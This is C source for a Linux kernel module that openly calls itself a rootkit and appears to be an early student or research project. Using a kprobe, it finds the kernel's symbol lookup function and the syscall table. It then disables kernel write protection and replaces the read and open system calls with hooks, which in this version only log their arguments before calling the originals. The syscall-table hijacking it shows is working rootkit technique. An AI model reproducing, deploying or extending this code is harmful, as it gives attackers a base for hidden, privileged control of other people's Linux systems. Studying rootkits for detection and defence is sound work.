#include <linux/fs.h>
#include <linux/ioctl.h>
#include <linux/kprobes.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/uaccess.h>

#include "rootkit-main.h"
#include "mem-protect.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
MODULE_DESCRIPTION("A Linux kernel rootkit");
MODULE_VERSION("0.1");

static unsigned long orig_cr0;
static kallsyms_t lookup_name;
static uint64_t *syscall_table;
static sysfun_t orig_read;
static sysfun_t orig_open;

static int __init rootkit_init(void)
{
    int err;

    // declare what we need to find
    struct kprobe probe = {
        .symbol_name = "kallsyms_lookup_name"
    };

    err = register_kprobe(&probe);
    if (err) {
        pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.\n");

        return err;
    }

    // function pointer type of kallsyms_lookup_name()
    lookup_name = (kallsyms_t) (probe.addr);

    // Find syscall table address
    syscall_table = lookup_name("sys_call_table");

    orig_cr0 = unprotect_memory();

    orig_read = (sysfun_t) syscall_table[__NR_read];
    syscall_table[__NR_read] = (uint64_t) new_read;
    orig_open = (sysfun_t) syscall_table[__NR_open];
    syscall_table[__NR_open] = (uint64_t) new_open;

    protect_memory(orig_cr0);

    pr_info("[ROOTKIT] Module loaded\n");
    pr_info("[ROOTKIT] kallsym_lookup_name() address: %p\n", lookup_name);
    pr_info("[ROOTKIT] Syscall table address: %p\n", syscall_table);
    return 0;
}

static __exit void rootkit_exit(void)
{
    orig_cr0 = unprotect_memory();

    syscall_table[__NR_read] = (uint64_t) orig_read;
    syscall_table[__NR_open] = (uint64_t) orig_open;

    protect_memory(orig_cr0);

    pr_info("[ROOTKIT] Module unloaded\n");
    return;
}

long new_read(struct pt_regs *regs)
{
    unsigned int fd = (unsigned int) regs->di; // first parameter
    char *buf = (char *) regs->si; // second parameter
    size_t count = (size_t) regs->dx; // third parameter

    pr_info("[ROOTKIT] read(%u, %p, %zd)", fd, buf, count);

    return orig_read(regs);
}

long new_open(struct pt_regs *regs)
{
    const char *filename = (const char *) regs->di;
    int flags = (int) regs->si;
    umode_t mode = (umode_t) regs->dx;

    pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)", filename, flags, mode);

    return orig_open(regs);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
